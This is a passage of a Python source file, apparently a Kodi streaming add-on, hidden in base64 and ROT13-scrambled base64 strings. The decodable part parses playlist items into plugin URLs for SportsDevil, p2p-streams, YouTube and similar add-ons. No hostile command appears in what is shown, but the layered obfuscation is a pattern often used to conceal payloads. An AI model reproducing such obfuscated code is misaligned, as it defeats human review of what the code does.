dCkNCg0KDQpkZWYgZ2V0U3ViQ2hhbm5lbEl0ZW1zKG5hbWUsdXJsLGZhbmFydCk6DQogICAgICAgIHNvdXAgPSBnZXRTb3VwKHVybCkNCiAgICAgICAgY2hhbm5lbF9saXN0ID0gc291cC5maW5kKCdzdWJjaGFubmVsJywgYXR0cnM9eyduYW1lJyA6IG5hbWUuZGVjb2RlKCd1dGYtOCcpfSkNCiAgICAgICAgaXRlbXMgPSBjaGFubmVsX2xpc3QoJ3N1Yml0ZW0nKQ0KICAgICAgICBnZXRJdGVtcyhpdGVtcyxmYW5hcnQpDQoNCg0KZGVmIGdldEl0ZW1zKGl0ZW1zLGZhbmFydCxkb250TGluaz1GYWxzZSk6DQogICAgICAgIHRvdGFsID0gbGVuKGl0ZW1zKQ0KICAgICAgICBhZGRvbl9sb2coJ1RvdGFsIEl0ZW1zOiAlcycgJXRvdGFsKQ0KICAgICAgICBhZGRfcGxheWxpc3QgPSBhZGRvbi5nZXRTZXR0aW5nKCdhZGRfcGxheWxpc3QnKQ0KICAgICAgICBhc2tfcGxheWxpc3RfaXRlbXMgPWFkZG9uLmdldFNldHRpbmcoJ2Fza19wbGF5bGlzdF9pdGVtcycpDQogICAgICAgIHVzZV90aHVtYiA9IGFkZG9uLmdldFNldHRpbmcoJ3VzZV90aHVtYicpDQogICAgICAgIHBhcmVudGFsYmxvY2sgPWFkZG9uLmdldFNldHRpbmcoJ3BhcmVudGFsYmxvY2tlZCcpDQogICAgICAgIHBhcmVudGFsYmxvY2s9IHBhcmVudGFsYmxvY2s9PSJ0cnVlIg0KICAgICAgICBmb3IgaXRlbSBpbiBpdGVtczoNCiAgICAgICAgICAgIGlzWE1MU291cmNlPUZhbHNlDQogICAgICAgICAgICBpc0pzb25ycGMgPSBGYWxzZQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBhcHBseWJsb2NrPSdmYWxzZScNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBhcHBseWJsb2NrID0gaXRlbSgncGFyZW50YWxibG9jaycpWzBdLnN0cmluZw0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGFkZG9uX2xvZygncGFyZW50YWxibG9jayBFcnJvcicpDQogICAgICAgICAgICAgICAgYXBwbHlibG9jayA9ICcnDQogICAgICAgICAgICBpZiBhcHBseWJsb2NrPT0ndHJ1ZScgYW5kIHBhcmVudGFsYmxvY2s6IGNvbnRpbnVlDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgbmFtZSA9IGl0ZW0oJ3RpdGxlJylbMF0uc3RyaW5nDQogICAgICAgICAgICAgICAgaWYgbmFtZSBpcyBOb25lOg0KICAgICAgICAgICAgICAgICAgICBuYW1lID0gJ3Vua25vd24/Jw0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGFkZG9uX2xvZygnTmFtZSBFcnJvcicpDQogICAgICAgICAgICAgICAgbmFtZSA9ICcnDQoNCg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlmIGl0ZW0oJ2VwZycpOg0KICAgICAgICAgICAgICAgICAgICBpZiBpdGVtLmVwZ191cmw6DQogICAgICAgICAgICAgICAgICAgICAgICBhZGRvbl9sb2coJ0dldCBFUEcgUmVnZXgnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXBnX3VybCA9IGl0ZW0uZXBnX3VybC5zdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgICAgIGVwZ19yZWdleCA9IGl0ZW0uZXBnX3JlZ2V4LnN0cmluZw0KICAgICAgICAgICAgICAgICAgICAgICAgZXBnX25hbWUgPSBnZXRfZXBnKGVwZ191cmwsIGVwZ19yZWdleCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGVwZ19uYW1lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgKz0gJyAtICcgKyBlcGdfbmFtZQ0KICAgICAgICAgICAgICAgICAgICBlbGlmIGl0ZW0oJ2VwZycpWzBdLnN0cmluZyA+IDE6DQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lICs9IGdldGVwZyhpdGVtKCdlcGcnKVswXS5zdHJpbmcpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGFkZG9uX2xvZygnRVBHIEVycm9yJykNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICB1cmwgPSBbXQ0KICAgICAgICAgICAgICAgIGlmIGxlbihpdGVtKCdsaW5rJykpID4wOg0KICAgICAgICAgICAgICAgICAgICAjcHJpbnQgJ2l0ZW0gbGluaycsIGl0ZW0oJ2xpbmsnKQ0KDQogICAgICAgICAgICAgICAgICAgIGZvciBpIGluIGl0ZW0oJ2xpbmsnKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybC5hcHBlbmQoaS5zdHJpbmcpDQoNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihpdGVtKCdzcG9ydHNkZXZpbCcpKSA+MDoNCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gaXRlbSgnc3BvcnRzZGV2aWwnKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNwb3J0c2RldmlsID0gJ3BsdWdpbjovL3BsdWdpbi52aWRlby5TcG9ydHNEZXZpbC8/bW9kZT0xJmFtcDtpdGVtPWNhdGNoZXIlM2RzdHJlYW1zJTI2dXJsPScgK2kuc3RyaW5nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmZXJlciA9IGl0ZW0oJ3JlZmVyZXInKVswXS5zdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByZWZlcmVyOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQgJ3JlZmVyZXIgZm91bmQnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNwb3J0c2RldmlsID0gc3BvcnRzZGV2aWwgKyAnJTI2cmVmZXJlcj0nICtyZWZlcmVyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsLmFwcGVuZChzcG9ydHNkZXZpbCkNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihpdGVtKCdwMnAnKSkgPjA6DQogICAgICAgICAgICAgICAgICAgIGZvciBpIGluIGl0ZW0oJ3AycCcpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGkuc3RyaW5nID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3NvcDovLycgaW4gaS5zdHJpbmc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNvcCA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8ucDJwLXN0cmVhbXMvP21vZGU9MnVybD0nK2kuc3RyaW5nICsnJicgKyAnbmFtZT0nK25hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsLmFwcGVuZChzb3ApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcDJwPSdwbHVnaW46Ly9wbHVnaW4udmlkZW8ucDJwLXN0cmVhbXMvP21vZGU9MSZ1cmw9JytpLnN0cmluZyArJyYnICsgJ25hbWU9JytuYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybC5hcHBlbmQocDJwKQ0KICAgICAgICAgICAgICAgIGVsaWYgbGVuKGl0ZW0oJ3ZhdWdobicpKSA+MDoNCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gaXRlbSgndmF1Z2huJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaS5zdHJpbmcgPT0gTm9uZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXVnaG4gPSAncGx1Z2luOi8vcGx1Z2luLnN0cmVhbS52YXVnaG5saXZlLnR2Lz9tb2RlPVBsYXlMaXZlU3RyZWFtJmFtcDtjaGFubmVsPScraS5zdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmwuYXBwZW5kKHZhdWdobikNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihpdGVtKCdpbGl2ZScpKSA+MDoNCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gaXRlbSgnaWxpdmUnKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCAnaHR0cCcgaW4gaS5zdHJpbmc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlsaXZlID0gJ3BsdWdpbjovL3BsdWdpbi52aWRlby50YmguaWxpdmUvP3VybD1odHRwOi8vd3d3LnN0cmVhbWxpdmUudG8vdmlldy8nK2kuc3RyaW5nKycmYW1wO2xpbms9OTkmYW1wO21vZGU9aUxpdmVQbGF5Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlsaXZlID0gJ3BsdWdpbjovL3BsdWdpbi52aWRlby50YmguaWxpdmUvP3VybD0nK2kuc3RyaW5nKycmYW1wO2xpbms9OTkmYW1wO21vZGU9aUxpdmVQbGF5Jw0KICAgICAgICAgICAgICAgIGVsaWYgbGVuKGl0ZW0oJ3l0LWRsJykpID4wOg0KICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiBpdGVtKCd5dC1kbCcpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGkuc3RyaW5nID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgeXRkbCA9IGkuc3RyaW5nICsgJyZtb2RlPTE4Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybC5hcHBlbmQoeXRkbCkNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihpdGVtKCdkbScpKSA+MDoNCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gaXRlbSgnZG0nKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRtID0gInBsdWdpbjovL3BsdWdpbi52aWRlby5kYWlseW1vdGlvbl9jb20vP21vZGU9cGxheVZpZGVvJnVybD0iICsgaS5zdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmwuYXBwZW5kKGRtKQ0KICAgICAgICAgICAgICAgIGVsaWYgbGVuKGl0ZW0oJ2RtbGl2ZScpKSA+MDoNCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gaXRlbSgnZG1saXZlJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaS5zdHJpbmcgPT0gTm9uZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbSA9ICJwbHVnaW46Ly9wbHVnaW4udmlkZW8uZGFpbHltb3Rpb25fY29tLz9tb2RlPXBsYXlMaXZlVmlkZW8mdXJsPSIgKyBpLnN0cmluZw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybC5hcHBlbmQoZG0pDQogICAgICAgICAgICAgICAgZWxpZiBsZW4oaXRlbSgndXR1YmUnKSkgPjA6DQogICAgICAgICAgICAgICAgICAgIGZvciBpIGluIGl0ZW0oJ3V0dWJlJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaS5zdHJpbmcgPT0gTm9uZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnICcgaW4gaS5zdHJpbmcgOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1dHViZSA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8ueW91dHViZS9zZWFyY2gvP3E9JysgdXJsbGliLnF1b3RlX3BsdXMoaS5zdHJpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzSnNvbnJwYz11dHViZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgbGVuKGkuc3RyaW5nKSA9PSAxMToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXR1YmUgPSAncGx1Z2luOi8vcGx1Z2luLnZpZGVvLnlvdXR1YmUvcGxheS8/dmlkZW9faWQ9JysgaS5zdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIChpLnN0cmluZy5zdGFydHN3aXRoKCdQTCcpIGFuZCBub3QgJyZvcmRlcj0nIGluIGkuc3RyaW5nKSBvciBpLnN0cmluZy5zdGFydHN3aXRoKCdVVScpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1dHViZSA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8ueW91dHViZS9wbGF5Lz8mb3JkZXI9ZGVmYXVsdCZwbGF5bGlzdF9pZD0nICsgaS5zdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGkuc3RyaW5nLnN0YXJ0c3dpdGgoJ1BMJykgb3IgaS5zdHJpbmcuc3RhcnRzd2l0aCgnVVUnKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXR1YmUgPSAncGx1Z2luOi8vcGx1Z2luLnZpZGVvLnlvdXR1YmUvcGxheS8/cGxheWxpc3RfaWQ9JyArIGkuc3RyaW5nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBpLnN0cmluZy5zdGFydHN3aXRoKCdVQycpIGFuZCBsZW4oaS5zdHJpbmcpID4gMTI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHV0dWJlID0gJ3BsdWdpbjovL3BsdWdpbi52aWRlby55b3V0dWJlL2NoYW5uZWwvJyArIGkuc3RyaW5nICsgJy8nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzSnNvbnJwYz11dHViZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgbm90IGkuc3RyaW5nLnN0YXJ0c3dpdGgoJ1VDJykgYW5kIG5vdCAoaS5zdHJpbmcuc3RhcnRzd2l0aCgnUEwnKSkgIDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXR1YmUgPSAncGx1Z2luOi8vcGx1Z2luLnZpZGVvLnlvdXR1YmUvdXNlci8nICsgaS5zdHJpbmcgKyAnLycNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNKc29ucnBjPXV0dWJlDQogICAgICAgICAgICAgICAgICAgICAgICB1cmwuYXBwZW5kKHV0dWJlKQ0KICAgICAgICAgICAgICAgIGVsaWYgbGVuKGl0ZW0oJ2ltZGInKSkgPjA6DQogICAgICAgICAgICAgICAgICAgIGZvciBpIGluIGl0ZW0oJ2ltZGInKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFkZG9uLmdldFNldHRpbmcoJ2dlbmVzaXNvcnB1bHNhcicpID09ICcwJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1kYiA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8uZ2VuZXNpcy8/YWN0aW9uPXBsYXkmaW1kYj0nK2kuc3RyaW5nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1kYiA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8ucHVsc2FyL21vdmllL3R0JytpLnN0cmluZysnL3BsYXknDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsLmFwcGVuZChpbWRiKQ0KICAgICAgICAgICAgICAgIGVsaWYgbGVuKGl0ZW0oJ2Y0bScpKSA+MDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIGl0ZW0oJ2Y0bScpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnLmY0bScgaW4gaS5zdHJpbmc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmNG0gPSAncGx1Z2luOi8vcGx1Z2luLnZpZGVvLmY0bVRlc3Rlci8/dXJsPScrdXJsbGliLnF1b3RlX3BsdXMoaS5zdHJpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJy5tM3U4JyBpbiBpLnN0cmluZzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGY0bSA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8uZjRtVGVzdGVyLz91cmw9Jyt1cmxsaWIucXVvdGVfcGx1cyhpLnN0cmluZykrJyZhbXA7c3RyZWFtdHlwZT1ITFMnDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGY0bSA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8uZjRtVGVzdGVyLz91cmw9Jyt1cmxsaWIucXVvdGVfcGx1cyhpLnN0cmluZykrJyZhbXA7c3RyZWFtdHlwZT1TSU1QTEUnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsLmFwcGVuZChmNG0pDQogICAgICAgICAgICAgICAgZWxpZiBsZW4oaXRlbSgnZnR2JykpID4wOg0KICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiBpdGVtKCdmdHYnKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ0diA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8uRi5ULlYvP25hbWU9Jyt1cmxsaWIucXVvdGUobmFtZSkgKycmdXJsPScgK2kuc3RyaW5nICsnJm1vZGU9MTI1JmNoX2ZhbmFydD1uYScNCiAgICAgICAgICAgICAgICAgICAgICAgIHVybC5hcHBlbmQoZnR2KQ0KICAgICAgICAgICAgICAgIGVsaWYgbGVuKGl0ZW0oJ3VybHNvbHZlJykpID4wOg0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gaXRlbSgndXJsc29sdmUnKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpLnN0cmluZyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmVyID0gaS5zdHJpbmcgKycmbW9kZT0xOScNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmwuYXBwZW5kKHJlc29sdmVyKQ0KICAgICAgICAgICAgICAgIGlmIGxlbih1cmwpIDwgMToNCiAgICAgICAgICAgICAgICAgICAgcmFpc2UNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBhZGRvbl9sb2coJ0Vycm9yIDxsaW5rPiBlbGVtZW50LCBQYXNzaW5nOicrbmFtZS5lbmNvZGUoJ3V0Zi04JywgJ2lnbm9yZScpKQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaXNYTUxTb3VyY2UgPSBpdGVtKCdleHRlcm5hbGxpbmsnKVswXS5zdHJpbmcNCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KDQogICAgICAgICAgICBpZiBpc1hNTFNvdXJjZToNCiAgICAgICAgICAgICAgICBleHRfdXJsPVtpc1hNTFNvdXJjZV0NCiAgICAgICAgICAgICAgICBpc1hNTFNvdXJjZT1UcnVlDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGlzWE1MU291cmNlPUZhbHNlDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaXNKc29ucnBjID0gaXRlbSgnanNvbnJwYycpWzBdLnN0cmluZw0KICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICBpZiBpc0pzb25ycGM6DQoNCiAgICAgICAgICAgICAgICBleHRfdXJsPVtpc0pzb25ycGNdDQogICAgICAgICAgICAgICAgI3ByaW50ICdKU09OLVJQQyBleHRfdXJsJyxleHRfdXJsDQogICAgICAgICAgICAgICAgaXNKc29ucnBjPVRydWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgaXNKc29ucnBjPUZhbHNlDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdGh1bWJuYWlsID0gaXRlbSgndGh1bWJuYWlsJylbMF0uc3RyaW5nDQogICAgICAgICAgICAgICAgaWYgdGh1bWJuYWlsID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgdGh1bWJuYWlsID0gJycNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBpZiBub3QgaXRlbSgnZmFuYXJ0Jyk6DQogICAgICAgICAgICAgICAgICAgIGlmIGFkZG9uLmdldFNldHRpbmcoJ3VzZV90aHVtYicpID09ICJ0cnVlIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGZhbkFydCA9IHRodW1ibmFpbA0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgZmFuQXJ0ID0gZmFuYXJ0DQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgZmFuQXJ0ID0gaXRlbSgnZmFuYXJ0JylbMF0uc3RyaW5nDQogICAgICAgICAgICAgICAgaWYgZmFuQXJ0ID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgZmFuQXJ0ID0gZmFuYXJ0DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgZGVzYyA9IGl0ZW0oJ2luZm8nKVswXS5zdHJpbmcNCiAgICAgICAgICAgICAgICBpZiBkZXNjID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgZGVzYyA9ICcnDQoNCiAgICAgICAgICAgIHRyeToNCiAgICAgICA'
love = 'tVPNtVPNtVPOaMJ5lMFN9VTy0MJ0bW2qyoaWyWlyoZS0hp3ElnJ5aQDbtVPNtVPNtVPNtVPNtVPNtnJLtM2IhpzHtCG0tGz9hMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtpzScp2HAPvNtVPNtVPNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtVPNtVPOaMJ5lMFN9VPpaQDbAPvNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPOxLKEyVQ0tnKEyoFtaMTS0MFpcJmOqYaA0pzyhMj0XVPNtVPNtVPNtVPNtVPNtVTyzVTEuqTHtCG0tGz9hMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtpzScp2HAPvNtVPNtVPNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtVPNtVPOxLKEyVQ0tWlpAPt0XVPNtVPNtVPNtVPNtpzIaMKumVQ0tGz9hMD0XVPNtVPNtVPNtVPNtnJLtnKEyoFtapzIaMKtaXGbAPvNtVPNtVPNtVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVUWyM19cqTIgVQ0tnKEyoFtapzIaMKtaXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOlMJqyrUZtCFOjLKWmMI9lMJqyrPulMJqsnKEyoFxAPvNtVPNtVPNtVPNtVPNtVPOyrTAypUD6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVUOup3ZAPvNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtVPOcMvOfMJ4bqKWfXFN+VQR6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVTSfqPN9VQNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtpTkurJkcp3DtCFOoKD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOzo3VtnFOcovO1pzj6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtVTSxMS9joTS5oTymqPN9CFNvMzSfp2HvBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuoUDtXm0tZD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuMTEZnJ5eXTxfWlImXFNyplptWFuuoUDfVT5uoJHhMJ5wo2EyXPq1qTLgBPpfVPqcM25ipzHaXFxfqTu1oJWhLJyfYTMuoxSlqPkxMKAwYTqyoaWyYTEuqTHfIUW1MFkjoTS5oTymqPklMJqyrUZfqT90LJjcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMJkcMvNtLJExK3OfLKyfnKA0VQ09VPW0paIyVvOuozDtVTSmn19joTS5oTymqS9cqTIgplN9CFNaqUW1MFp6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVUWyM2I4pmbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOfLKyfnKA0YzSjpTIhMPucXlpzpzIaMKumCFpepzIaMKumXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyoTyzVPOuoaxbrPOcovOcVTMipvO4VTyhVUWyp29fqzIsqKWfXFOuozDtVTxhp3EupaEmq2y0nPtanUE0pPpcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpTkurJkcp3DhLKOjMJ5xXTxeWlMgo2EyCGR5WlxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOfLKyfnKA0YzSjpTIhMPucXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTIfp2H6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOfLKyfnKA0YzSjpTIhMPucXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOfMJ4bpTkurJkcp3DcVQ4tZGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTSxMRkcozfbWlpfVT5uoJHfqTu1oJWhLJyfYTMuoxSlqPkxMKAwYTqyoaWyYTEuqTHfIUW1MFkjoTS5oTymqPklMJqyrUZfqT90LJjcQDbtVPNtVPNtVPNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVTEioaEZnJ5eBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpzI0qKWhVT5uoJHfqKWfJmOqYUWyM2I4pj0XVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOcp1uAGSAiqKWwMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOho3DtpzIaMKumVQ09VR5iozH6VPZ8MKu0MKWhLJkfnJ5eCvOuozDtCUWyM2I4Ct0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuMTERnKVbozSgMF5yozAiMTHbW3I0Mv04WlxfMKu0K3IloSfjKF5yozAiMTHbW3I0Mv04WlxfZFk0nUIgLz5unJjfMzShLKW0YTEyp2ZfM2IhpzHfMTS0MFkBo25yYPpuVKIjMTS0MFpfpzIaMKumYUIloSfjKF5yozAiMTHbW3I0Mv04WlxcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPAuMTEZnJ5eXUIloSfjKFkhLJ1yYzIhL29xMFtaqKEzYGtaYPNanJqho3WyWlxeVPNaJ0ACGR9FVUyyoTkiq11vqJyfMPOLGHkoY0ACGR9FKFpfqTu1oJWhLJyfYTMuoxSlqPkxMKAwYTqyoaWyYTEuqTHfIUW1MFkBo25yYUWyM2I4plk0o3EuoPxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuMTERnKVbozSgMF5yozAiMTHbW3I0Mv04WlxfMKu0K3IloSfjKF5yozAiMTHbW3I0Mv04WlxfZFk0nUIgLz5unJjfMzShLKW0YTEyp2ZfM2IhpzHfMTS0MFkBo25yYPqmo3IlL2HaYR5iozHfGz9hMFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtV2SxMREcpvuhLJ1yYzIhL29xMFtaqKEzYGtaXFk1pzkoZS0hMJ5wo2EyXPq1qTLgBPpcYQRfqTu1oJWhLJyfYTMuozSlqPkxMKAwYTqyoaWyYTEuqTHfGz9hMFjap291pzAyWlxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtMJkcMvOcp0cmo25lpTZ6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNt